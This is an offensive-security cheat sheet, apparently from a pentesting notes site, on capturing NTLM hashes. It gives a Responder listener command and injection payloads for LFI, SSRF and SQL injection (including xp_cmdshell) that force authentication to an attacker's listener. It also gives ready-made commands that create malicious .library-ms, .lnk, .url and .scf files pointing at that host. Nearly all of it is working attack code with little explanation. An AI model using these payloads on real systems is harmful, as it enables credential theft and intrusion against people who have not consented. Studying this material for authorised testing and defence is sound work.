---
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: false
---

# Capturing NTLM

## Listener

```sh
sudo responder -I <interface> -A [-v]
```

## Possible Attacks

### Via web vulnerability

If you discover a web vulnerability (such as LFI, SQLI, XXE, SSRF, SSTI) that allows you to include remote files, you can exploit it to steal the NTLM hash of the user running the process. For example:

```sh
# LFI
?page=\\<listener_ip>\shared

# SSRF
?url=file:////<listener_ip>/shared

# SQL Injection
?id=1' union select null,load_file('\\\\<listener_ip>\\shared'),null-- -
?id=1' union select null,(select x from OpenRowset(BULK '\\<listener_ip>\shared',SINGLE_CLOB) R(x)),null-- -
?id=1' union select null,(EXEC xp_cmdshell 'dir \\<listener_ip>\shared'),null-- -
```

### Via .library-ms file

```sh
cat > '!shared.library-ms' <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\<listener_ip>\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
EOF
```

### Via .lnk file

```sh
pylnk3 c '\\<listener_ip>\shared' '!shared.lnk' -i '\\<listener_ip>\shared\icon.ico'
```

### Via .url file

```sh
cat > '!shared.url' <<'EOF'
[InternetShortcut]
URL=\\\\<listener_ip>\\shared
IconIndex=1
IconFile=\\\\<listener_ip>\\shared\\icon.ico
EOF
```

### Via .scf file

```sh
cat > '!shared.scf' <<'EOF'
[Shell]
Command=2
IconFile=\\\\<listener_ip>\\shared\\icon.ico
[Taskbar]
Command=ToggleDesktop
EOF
```
